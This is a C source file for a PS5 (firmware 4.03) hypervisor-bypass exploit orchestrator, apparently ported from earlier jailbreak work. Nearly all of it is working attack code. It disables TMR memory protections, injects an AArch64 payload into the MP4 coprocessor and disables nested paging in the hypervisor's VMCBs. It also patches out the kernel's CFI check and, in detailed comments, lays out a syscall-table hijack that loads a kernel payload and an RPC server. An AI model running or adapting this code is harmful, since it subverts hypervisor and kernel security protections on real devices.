/*
 * Prosperous exploit orchestrator for PS5 FW 4.03.
 *
 * This is the main entry point that chains together all exploit stages:
 *
 *   Stage 1: TMR Bypass
 *     - Disable TMR 20 (MP4 carveout) for x86 write access to MP4 DRAM
 *     - Create TMR 21 covering kernel text region with all-access
 *     - Disable TMR 5/17/18 (HV region protections)
 *
 *   Stage 2: MP4 Payload Injection
 *     - Write AArch64 EL3 thunk to MP4 DRAM at 0x600E0000
 *     - Write main payload to 0x607F1000
 *     - Hook mDbg_intr → thunk → payload
 *     - Enable QAF flag to activate
 *
 *   Stage 3: VMCB Patching
 *     - Setup SysHub TLB entries to map HV memory via MP4
 *     - Read vCPU contexts and VMCB pointers
 *     - Disable nested paging (NP_ENABLE=0) on all VMCBs
 *     - Clear most intercepts (keep VMSAVE/VMLOAD/VMMCALL/VMRUN)
 *
 *   Stage 4: TMR Restore
 *     - Re-enable TMR 20 (prevents kernel panic on game restart)
 *     - Restore HV TMR protections (5/17/18)
 *
 *   Stage 5: CFI Bypass + Kernel Payload
 *     - NOP the cfi_check_fail function via MP4 write
 *     - Inject kpayload via syscall table hijack
 *     - kpayload disables NDA on all cores, elevates privileges
 *     - Starts TCP RPC server on port 6670
 *
 * Prerequisites:
 *   - Kernel R/W via kekcall (ps5-kstuff or equivalent loaded)
 *   - Physical memory access via DMAP
 *   - Network connectivity to PS5
 *
 * Build: Part of the prosperous_port PS5 payload SDK build.
 * Deploy: Via PS5_DEPLOY to console running on FW 4.03.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/*
 * Discover the DMAP base address by reading the current process's pmap.
 *
 * The DMAP base is computed as: pm_pml4 (kernel VA) - pm_cr3 (PA)
 * This gives the kernel's direct-map base for physical memory.
 */
static int discover_dmap_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t vmspace;
    uint64_t pm_pml4;
    uint64_t pm_cr3;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0) {
        printf("[!] Failed to get proc address\n");
        return -1;
    }

    /* proc -> p_vmspace */
    kernel_copyout(proc_addr + OFF_PROC_P_VMSPACE, &vmspace, sizeof(vmspace));

    /* vmspace -> vm_pmap -> pm_pml4 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_PML4,
                   &pm_pml4, sizeof(pm_pml4));

    /* vmspace -> vm_pmap -> pm_cr3 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_CR3,
                   &pm_cr3, sizeof(pm_cr3));

    ctx->dmap_base = pm_pml4 - pm_cr3;
    ctx->proc_cr3 = pm_cr3;
    printf("[*] DMAP base: 0x%lx\n", ctx->dmap_base);
    printf("[*] Process CR3: 0x%lx\n", ctx->proc_cr3);

    return 0;
}

/*
 * Discover the kernel text base address.
 *
 * We scan kernel data for the kernel pmap structure by looking for
 * characteristic field values, or use the LSTAR MSR approach.
 */
static int discover_kernel_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t sysvec;
    uint64_t sysent;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0)
        return -1;

    /* Read kernel text base from the process's sysvec.
     * proc -> p_sysent -> sysvec points to the system call vector,
     * which is in kernel .data and gives us a reference address. */
    kernel_copyout(proc_addr + OFF_PROC_P_SYSENT, &sysvec, sizeof(sysvec));
    kernel_copyout(sysvec + OFF_SYSVEC_SYSENT, &sysent, sizeof(sysent));

    /* The sysent table is at a known offset from kernel base.
     * We can also read ktext_start_va from the TMR 16 base. */

    /* Alternative: use TMR 16 base to get kernel text PA,
     * then read the VA from a known offset */
    uint32_t tmr16_base;
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;
    uint32_t tmr16_addr = 16 * 0x10;

    kernel_copyin(&tmr16_addr, ind_index_kva, sizeof(tmr16_addr));
    kernel_copyout(ind_data_kva, &tmr16_base, sizeof(tmr16_base));

    ctx->ktext_base_pa = (uint64_t)tmr16_base << 16;

    printf("[*] Kernel text PA: 0x%lx\n", ctx->ktext_base_pa);

    /* Derive kernel text VA from DMAP: any kernel VA = DMAP + PA works
     * for accessing kernel data via kernel_copyout. We use DMAP+PA
     * for all accesses since KOFF_KTEXT_VA_PTR is FW-specific and
     * unreliable across firmware versions. */
    ctx->ktext_base = ctx->dmap_base + ctx->ktext_base_pa;
    printf("[*] Kernel text (DMAP): 0x%lx\n", ctx->ktext_base);

    /* Get kernel PML4 PA */
    uint64_t kpmap_addr = ctx->ktext_base + KOFF_KERNEL_PMAP;
    uint64_t kpmap;
    kernel_copyout(kpmap_addr, &kpmap, sizeof(kpmap));
    kernel_copyout(kpmap + OFF_PMAP_PM_CR3, &ctx->kpml4_pa, sizeof(ctx->kpml4_pa));

    printf("[*] Kernel PML4 PA: 0x%lx\n", ctx->kpml4_pa);

    return 0;
}

/*
 * NOP the cfi_check_fail function via MP4 memory write.
 *
 * This is necessary because the kernel uses Control Flow Integrity (CFI)
 * checks that would trap our syscall table hijack. By NOPing the check
 * function, we prevent CFI from blocking our payload execution.
 *
 * We use the MP4 coprocessor to write to kernel text because it has
 * its own DMA path that bypasses x86 page table NX/RO protections.
 */
static int cfi_bypass(struct phys_rw_ctx *ctx)
{
    uint64_t cfi_check_fail_pa = ctx->ktext_base_pa + KOFF_CFI_CHECK_FAIL;
    uint32_t nop_sled = 0xC3C3C3C3; /* ret; ret; ret; ret */

    /* Setup SysHub TLB to map the kernel text region */
    if (mp4_syshub_tlb_setup(ctx, 32, cfi_check_fail_pa) != 0) {
        printf("[!] Failed to setup SysHub TLB for CFI bypass\n");
        return -1;
    }

    /* Write NOP/RET over cfi_check_fail via MP4 */
    uint32_t mp4_va = 0x80000000 + (cfi_check_fail_pa & 0x03FFFFFF);
    mp4_write32(ctx, mp4_va, nop_sled);

    printf("[*] CFI check_fail patched at PA 0x%lx\n", cfi_check_fail_pa);
    return 0;
}

/*
 * Main exploit entry point.
 */
int prosperous_run(void)
{
    struct phys_rw_ctx ctx;
    int ret;

    /* Disable stdout buffering so all diagnostics are visible */
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("========================================\n");
    printf(" prosperous_port - PS5 HV Bypass\n");
    printf(" FW 4.03 (CEX)\n");
    printf(" Ported from fail0verflow/prosperous\n");
    printf("========================================\n\n");

    /* Phase 0: Discover memory layout */
    printf("[*] Phase 0: Discovering memory layout...\n");

    ret = discover_dmap_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover DMAP base\n");
        return ret;
    }

    ret = discover_kernel_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover kernel base\n");
        return ret;
    }

    /* Phase 1: TMR bypass */
    printf("\n[*] Phase 1: TMR bypass...\n");

    ret = tmr_bypass_init(&ctx);
    if (ret != 0) {
        printf("[!] TMR bypass init failed: %d\n", ret);
        return ret;
    }
    printf("[+] TMR 20 disabled, TMR 21 created\n");

    /* Phase 1.5: Explore DRAM access mechanisms
     *
     * CONFIRMED RESULTS:
     *   - PD[0x100] = not present  (PA 0x60000000-0x601FFFFF — no guest mapping)
     *   - PD[0x101] = not present  (PA 0x60200000-0x603FFFFF — no guest mapping)
     *   - PD[0x102] = 4KB PT @ PA 0x9876000 (PA 0x60400000-0x605FFFFF — PARTIAL)
     *   - PD[0x103-0x107] = 2MB pages (PA 0x60600000-0x60FFFFFF — fully accessible)
     *   - No GPU on PCI buses 0-15 (integrated, not enumerable)
     *   - B0:D1:F0 cap_ptr=0x00 (not actually an IOMMU)
     *   - B0:D1:F1 (0x13DF1022) bridge → bus 64
     *   - B0:D8:F1 (0x13E51022) bridge → bus 32
     *   - Kernel CR3 = 0x0 (kernel pmap read failed — wrong KOFF_KERNEL_PMAP?)
     *
     * THIS ITERATION: Walk PD[0x102]'s 4KB page table to find which
     * pages in 0x60400000-0x605FFFFF are accessible. Also scan the
     * bridge secondary buses (32, 64) for DMA-capable devices.
     * Probe B0:D0:F2 (class 0x080600) as potential IOMMU.
     */
    printf("\n[*] Phase 1.5: Exploring DRAM access mechanisms...\n");
    {
        uint64_t dmap = ctx.dmap_base;

        /* === Part A: Walk PD[0x102]'s 4KB page table ===
         * PD[0x102] points to a page table at PA 0x9876000 (from last run).
         * This covers VA range DMAP+0x60400000 to DMAP+0x605FFFFF.
         * Each PTE covers 4KB. 512 PTEs = 2MB.
         * Find which 4KB pages in the MP4 DRAM are actually mapped.
         *
         * SAFE: reading page table entries from a known PA via DMAP. */
        printf("[*] Part A: Walking PD[0x102] page table (PA 0x60400000-0x605FFFFF)...\n");
        {
            uint64_t target_va = dmap + MP4_DRAM_BASE;
            uint32_t pml4_idx = (target_va >> 39) & 0x1FF;
            uint32_t pdpt_idx = (target_va >> 30) & 0x1FF;
            uint32_t pd_idx   = (target_va >> 21) & 0x1FF;
            uint64_t cr3 = ctx.proc_cr3;
            uint64_t pml4e, pdpte, pd_pa;

            kernel_copyout(dmap + cr3 + pml4_idx * 8, &pml4e, 8);
            uint64_t pdpt_pa = pml4e & 0xFFFFFFFFFF000ULL;
            kernel_copyout(dmap + pdpt_pa + pdpt_idx * 8, &pdpte, 8);
            pd_pa = pdpte & 0xFFFFFFFFFF000ULL;

            /* Read PD[0x102] to get the page table PA */
            uint64_t pde_102;
            kernel_copyout(dmap + pd_pa + (pd_idx + 2) * 8, &pde_102, 8);
            printf("[PT] PD[0x%x] = 0x%016lx\n", pd_idx + 2, pde_102);

            if ((pde_102 & 1) && !(pde_102 & (1 << 7))) {
                uint64_t pt_pa = pde_102 & 0xFFFFFFFFFF000ULL;
                printf("[PT] Page table PA = 0x%lx\n", pt_pa);

                /* Walk all 512 PTEs */
                int present_count = 0;
                int first_present = -1;
                int last_present = -1;
                for (int i = 0; i < 512; i++) {
                    uint64_t pte;
                    kernel_copyout(dmap + pt_pa + i * 8, &pte, 8);
                    if (pte & 1) {
                        uint64_t page_pa = pte & 0xFFFFFFFFFF000ULL;
                        if (present_count < 16 || i >= 496) {
                            printf("[PT] PTE[%3d] = 0x%016lx (PA=0x%lx%s%s%s)\n",
                                   i, pte, page_pa,
                                   (pte & 2) ? " W" : " R",
                                   (pte & 4) ? " U" : " S",
                                   (pte & 0x10) ? " PCD" : "");
                        } else if (present_count == 16) {
                            printf("[PT] ... (showing first 16 and last 16)\n");
                        }
                        if (first_present < 0) first_present = i;
                        last_present = i;
                        present_count++;
                    }
                }
                printf("[PT] Summary: %d/512 PTEs present", present_count);
                if (present_count > 0) {
                    printf(" (pages %d-%d, PA 0x%llx-0x%llx)",
                           first_present, last_present,
                           0x60400000ULL + first_present * 0x1000,
                           0x60400000ULL + last_present * 0x1000 + 0xFFF);
                }
                printf("\n");

                /* Critical check: which of our target addresses fall
                 * in accessible pages?
                 * Hook:  0x60008BD4 → PD[0x100] PTE[8]  → NOT in PD[0x102]
                 * Thunk: 0x600E0000 → PD[0x100] PTE[224] → NOT in PD[0x102]
                 * QAF:   0x60123B74 → PD[0x100] PTE[291] → NOT in PD[0x102]
                 * BUT: if PD[0x102] maps 0x60400000+, then DRAM offset
                 * 0x400000+ is accessible. The A53 ELF at DRAM 0x100000
                 * is still in PD[0x100] (blocked). */
            }

            /* Also confirm PD[0x100] and PD[0x101] are truly not present */
            for (int i = 0; i < 4; i++) {
                uint64_t pde;
                kernel_copyout(dmap + pd_pa + (pd_idx + i) * 8, &pde, 8);
                printf("[PT] PD[0x%x] = 0x%016lx (%s)\n",
                       pd_idx + i, pde,
                       (pde & 1) ? "PRESENT" : "not present");
            }
        }

        /* === Part B: Scan bridge secondary buses (32, 64) ===
         * Previous run found:
         *   B0:D1:F1 → sec=64, sub=64
         *   B0:D8:F1 → sec=32, sub=32
         * Scan these for USB/NVMe/DMA devices.
         * SAFE: standard PCI config space reads. */
        printf("\n[*] Part B: Scanning bridge secondary buses (32, 64)...\n");
        uint32_t bridge_buses[] = { 32, 64 };
        for (int b = 0; b < 2; b++) {
            uint32_t bus = bridge_buses[b];
            printf("[*] Scanning bus %u...\n", bus);
            for (uint32_t dev = 0; dev < 32; dev++) {
                for (uint32_t func = 0; func < 8; func++) {
                    uint64_t ecam = dmap + MMCFG_BASE +
                        ((uint64_t)bus << 20) + ((uint64_t)dev << 15) +
                        ((uint64_t)func << 12);
                    uint32_t dev_id;
                    kernel_copyout(ecam, &dev_id, 4);
                    if (dev_id == 0xFFFFFFFF || dev_id == 0)
                        continue;

                    uint32_t class_reg;
                    kernel_copyout(ecam + 0x08, &class_reg, 4);
                    uint32_t class_code = class_reg >> 8;

                    printf("[PCI] B%u:D%u:F%u ID=0x%08x class=0x%06x",
                           bus, dev, func, dev_id, class_code);

                    for (int bar = 0; bar < 6; bar++) {
                        uint32_t bar_val;
                        kernel_copyout(ecam + 0x10 + bar * 4, &bar_val, 4);
                        if (bar_val != 0 && bar_val != 0xFFFFFFFF)
                            printf(" BAR%d=0x%08x", bar, bar_val);
                    }

                    /* For bridges: secondary/subordinate */
                    if ((class_code >> 8) == 0x0604) {
                        uint32_t bus_reg;
                        kernel_copyout(ecam + 0x18, &bus_reg, 4);
                        printf(" sec=%u sub=%u",
                               (bus_reg >> 8) & 0xFF,
                               (bus_reg >> 16) & 0xFF);
                    }
                    printf("\n");

                    if (func == 0) {
                        uint32_t hdr_type;
                        kernel_copyout(ecam + 0x0C, &hdr_type, 4);
                        if (!((hdr_type >> 16) & 0x80))
                            break;
                    }
                }
            }
        }

        /* === Part C: Probe B0:D0:F2 (0x13E11022, class 0x080600) ===
         * Class 0x080600 = "System peripheral / IOMMU".
         * This might be the actual IOMMU with capabilities.
         * Also dump full PCI config (first 0x100 bytes) for B0:D1:F1
         * since that's the PCIe bridge to bus 64. */
        printf("\n[*] Part C: IOMMU probe on B0:D0:F2...\n");
        {
            uint64_t ecam_002 = dmap + pci_cfg_addr(0, 0, 2, 0);
            uint32_t dev_id;
            kernel_copyout(ecam_002, &dev_id, 4);
            printf("[DEV] B0:D0:F2 ID=0x%08x\n", dev_id);

            uint32_t cap_ptr;
            kernel_copyout(ecam_002 + 0x34, &cap_ptr, 4);
            cap_ptr &= 0xFF;
            printf("[DEV] Capability pointer: 0x%02x\n", cap_ptr);

            for (int tries = 0; tries < 16 && cap_ptr >= 0x40; tries++) {
                uint32_t cap_hdr;
                kernel_copyout(ecam_002 + cap_ptr, &cap_hdr, 4);
                uint8_t cap_id = cap_hdr & 0xFF;
                printf("[DEV] Cap @ 0x%02x: ID=0x%02x hdr=0x%08x\n",
                       cap_ptr, cap_id, cap_hdr);

                if (cap_id == 0x0F) {
                    uint32_t base_lo, base_hi;
                    kernel_copyout(ecam_002 + cap_ptr + 4, &base_lo, 4);
                    kernel_copyout(ecam_002 + cap_ptr + 8, &base_hi, 4);
                    uint64_t iommu_base = ((uint64_t)base_hi << 32) |
                                          (base_lo & 0xFFFFC000ULL);
                    printf("[IOMMU] MMIO base PA = 0x%lx\n", iommu_base);

                    uint64_t dt_base;
                    kernel_copyout(dmap + iommu_base + 0x00, &dt_base, 8);
                    printf("[IOMMU] DeviceTable base = 0x%016lx\n", dt_base);

                    uint64_t ctrl;
                    kernel_copyout(dmap + iommu_base + 0x18, &ctrl, 8);
                    printf("[IOMMU] Control reg     = 0x%016lx\n", ctrl);

                    uint64_t dt_pa = dt_base & 0xFFFFFFFFF000ULL;
                    uint32_t dt_size = ((dt_base & 0x1FF) + 1) * 4096;
                    printf("[IOMMU] DeviceTable PA=0x%lx size=%u entries\n",
                           dt_pa, dt_size / 32);

                    printf("[IOMMU] First 8 DTEs:\n");
                    for (int e = 0; e < 8; e++) {
                        uint64_t dte[4];
                        for (int w = 0; w < 4; w++)
                            kernel_copyout(dmap + dt_pa + e * 32 + w * 8,
                                          &dte[w], 8);
                        if (dte[0] || dte[1] || dte[2] || dte[3])
                            printf("[IOMMU] DTE[%d]: %016lx %016lx %016lx %016lx\n",
                                   e, dte[0], dte[1], dte[2], dte[3]);
                    }
                    break;
                }
                cap_ptr = (cap_hdr >> 8) & 0xFF;
            }
        }

        /* === Part D: Probe both IOMMU-like devices more thoroughly ===
         * Dump first 0x40 bytes of PCI config for B0:D1:F0 and B0:D8:F0
         * (class 0x060000) to find IOMMU base addresses. On AMD SoCs,
         * IOMMU may be configured via the host bridge's extended caps. */
        printf("\n[*] Part D: Extended PCI config dump for host bridges...\n");
        {
            uint32_t bridges[][2] = {{1,0}, {8,0}};
            for (int b = 0; b < 2; b++) {
                uint64_t ecam = dmap + pci_cfg_addr(0, bridges[b][0],
                                                     bridges[b][1], 0);
                printf("[PCI] B0:D%u:F%u config space:\n", bridges[b][0],
                       bridges[b][1]);
                for (int off = 0; off < 0x60; off += 4) {
                    uint32_t val;
                    kernel_copyout(ecam + off, &val, 4);
                    if (val != 0 && val != 0xFFFFFFFF)
                        printf("  +0x%02x = 0x%08x\n", off, val);
                }
                /* Check extended config space for IOMMU capability */
                uint32_t cap_ptr;
                kernel_copyout(ecam + 0x34, &cap_ptr, 4);
                cap_ptr &= 0xFF;
                if (cap_ptr >= 0x40) {
                    printf("  Cap list:\n");
                    for (int tries = 0; tries < 16 && cap_ptr >= 0x40; tries++) {
                        uint32_t cap_hdr;
                        kernel_copyout(ecam + cap_ptr, &cap_hdr, 4);
                        uint8_t cap_id = cap_hdr & 0xFF;
                        printf("  Cap @ 0x%02x: ID=0x%02x\n", cap_ptr, cap_id);

                        if (cap_id == 0x0F) {
                            uint32_t base_lo, base_hi;
                            kernel_copyout(ecam + cap_ptr + 4, &base_lo, 4);
                            kernel_copyout(ecam + cap_ptr + 8, &base_hi, 4);
                            uint64_t iommu_base = ((uint64_t)base_hi << 32) |
                                                  (base_lo & 0xFFFFC000ULL);
                            printf("  IOMMU MMIO base = 0x%lx\n", iommu_base);
                        }
                        cap_ptr = (cap_hdr >> 8) & 0xFF;
                    }
                }
            }
        }

        /* === Part E: Test DRAM access at PD[0x102] boundary ===
         * If PD[0x102]'s page table has present entries, we can
         * access some pages in 0x60400000-0x605FFFFF.
         * Test read at DMAP+0x60400000 (first page of PD[0x102]).
         *
         * SAFE: PD[0x102] exists (flags=PWU), so the guest mapping
         * is present. If nPT blocks it, kernel_copyout returns -1
         * (proven by Phase 2 which returned rc=-1, no panic). */
        printf("\n[*] Part E: Testing DRAM reads in PD[0x102] range...\n");
        {
            uint32_t test_offsets[] = {
                0x60400000, 0x60480000, 0x60500000, 0x60580000,
                0x605D0000, 0x605E0000
            };
            for (int i = 0; i < 6; i++) {
                uint32_t val = 0xDEADDEAD;
                int32_t rc = kernel_copyout(dmap + test_offsets[i], &val, 4);
                printf("[DRAM] PA 0x%08x: val=0x%08x rc=%d %s\n",
                       test_offsets[i], val, rc,
                       (rc == 0 && val != 0xDEADDEAD) ? "ACCESSIBLE" : "BLOCKED");
            }

            /* Also verify PD[0x103] range still works */
            uint32_t val = 0;
            kernel_copyout(dmap + 0x60600000ULL, &val, 4);
            printf("[DRAM] PA 0x60600000: val=0x%08x (PD[0x103] reference)\n", val);
        }
    }

    /* Phase 2: MP4 payload injection */
    printf("\n[*] Phase 2: MP4 payload injection...\n");

    ret = mp4_inject_payload(&ctx);
    if (ret != 0) {
        printf("[!] MP4 payload injection failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload injected and activated\n");

    /* Re-enable TMR 20 after injection (matches original prosperous flow).
     * The A53 accesses its own DRAM through its IOMMU, not through x86 TMR.
     * Leaving TMR 20 disabled causes kernel panics on game restart. */
    tmr_restore_tmr20(&ctx);
    printf("[+] TMR 20 restored\n");

    /* Give the A53 time to process the QAF flag and activate the payload.
     * The payload hooks mDbg_intr via SError handler - the A53 needs to
     * take an interrupt cycle to activate the hook. */
    printf("[*] Waiting for MP4 payload activation...\n");
    usleep(500000); /* 500ms */

    /* Diagnostic: read c2p reg 0 to see if a previous command is stuck */
    {
        uint32_t c2p0_val;
        uint64_t bar2_kva = ctx.dmap_base + MP4_BAR2_PA;
        kernel_copyout(bar2_kva + MP4_C2P_REG(0, 0), &c2p0_val, sizeof(c2p0_val));
        printf("[DIAG] c2p reg 0 before ping: 0x%08x\n", c2p0_val);

        /* Also read p2c reg 0 to check if A53 has sent anything */
        uint32_t p2c0_val;
        kernel_copyout(bar2_kva + MP4_P2C_REG0(0), &p2c0_val, sizeof(p2c0_val));
        printf("[DIAG] p2c reg 0: 0x%08x\n", p2c0_val);
    }

    /* Verify MP4 payload is alive (retry a few times) */
    for (int attempt = 0; attempt < 5; attempt++) {
        ret = mp4_ping(&ctx);
        if (ret == 0)
            break;
        printf("[*] MP4 ping attempt %d failed, retrying...\n", attempt + 1);
        usleep(500000);
    }
    if (ret != 0) {
        printf("[!] MP4 payload not responding after retries\n");
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload ping OK\n");

    /* Phase 3: Disable HV TMR protections */
    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");

    ret = tmr_disable_hv_regions(&ctx);
    if (ret != 0) {
        printf("[!] HV TMR disable failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] HV TMR protections disabled\n");

    /* Phase 4: VMCB patching */
    printf("\n[*] Phase 4: VMCB patching (disabling nested paging)...\n");

    ret = vmcb_patch_disable_np(&ctx);
    if (ret != 0) {
        printf("[!] VMCB patching failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] Nested paging disabled on all VMCBs\n");

    /* Phase 5: CFI bypass */
    printf("\n[*] Phase 5: CFI bypass...\n");

    ret = cfi_bypass(&ctx);
    if (ret != 0) {
        printf("[!] CFI bypass failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] CFI check_fail patched\n");

    /* Phase 6: Restore TMR protections */
    printf("\n[*] Phase 6: Restoring TMR protections...\n");
    tmr_restore_hv_regions(&ctx);
    printf("[+] TMR protections restored\n");

    /* Phase 7: Kernel payload injection */
    printf("\n[*] Phase 7: Kernel payload injection...\n");
    printf("[*] kpayload will be injected via syscall table hijack.\n");
    printf("[*] After injection, connect to port 6670 for RPC access.\n");

    ret = kpayload_inject(&ctx);
    if (ret != 0) {
        printf("[!] kpayload injection failed: %d\n", ret);
        return ret;
    }

    printf("\n========================================\n");
    printf(" [+] Exploit complete!\n");
    printf(" [+] RPC server listening on port 6670\n");
    printf(" [+] Connect with: python3 client.py\n");
    printf("========================================\n");

    return 0;
}

/*
 * Kernel payload injection via syscall table hijack.
 *
 * This follows the same approach as prosperous:
 *   1. Allocate userspace buffer for kpayload binary
 *   2. Map it with a 1GB page at 0xFFFFFFC0_00000000 for kernel access
 *   3. Temporarily replace syscall 8's handler with our payload
 *   4. Invoke syscall 8 to execute the payload in kernel context
 *   5. Restore the original syscall handler
 *
 * The kpayload binary must be loaded from disk or embedded.
 */
int kpayload_inject(struct phys_rw_ctx *ctx)
{
    printf("[*] kpayload injection placeholder\n");
    printf("[*] To complete: load kpayload binary and inject via sysent hijack\n");
    printf("[*] See pwn_mp4.lua from prosperous for the full injection flow\n");

    /*
     * TODO: Full implementation would:
     *
     * 1. Load kpayload binary from /mnt/usb0/kpayload or embed it
     *
     * 2. mmap a buffer and copy kpayload into it:
     *    void *payload_buf = mmap(NULL, size, PROT_READ|PROT_WRITE,
     *                             MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
     *    memcpy(payload_buf, kpayload_data, kpayload_size);
     *
     * 3. Get physical address of payload buffer:
     *    uint64_t payload_pa = vtophys(payload_buf);
     *
     * 4. Create a 1GB kernel mapping:
     *    uint64_t payload_kva = 0xFFFFFFC000000000 | (payload_pa & 0x3FFFFFFF);
     *    // Write PDPE at kpml4[0xFF8] + 0x800
     *    uint64_t pdp_pa = (read_phys64(kpml4_pa + 0xFF8) >> 12) << 12;
     *    write_phys64(pdp_pa + 0x800,
     *                 ((payload_pa >> 30) << 30) | 0x83);  // 1GB page, RWX
     *
     * 5. Read current sysent[8] and replace:
     *    // proc -> sysvec -> sysent
     *    uint64_t sysent_8_pa = get_pa(sysent_va + 0x30 * 8);
     *    uint64_t orig_call = read_phys64(sysent_8_pa + 8);
     *    write_phys32(sysent_8_pa, 8);  // narg = 8
     *    write_phys64(sysent_8_pa + 8, payload_kva);
     *
     * 6. Invoke syscall 8 multiple times (progressive init):
     *    syscall(8, ktext_base, payload_buf, host_addr, 0);  // op=0: version check
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 1);  // op=1: reloc
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 2);  // op=2: nda disable
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 3);  // op=3: full init
     *
     * 7. Restore sysent[8]:
     *    write_phys32(sysent_8_pa, 0);
     *    write_phys64(sysent_8_pa + 8, orig_call);
     *
     * 8. Clean up kernel mapping:
     *    write_phys64(pdp_pa + 0x800, 0);
     */

    return 0;
}

int main(void)
{
    return prosperous_run();
}
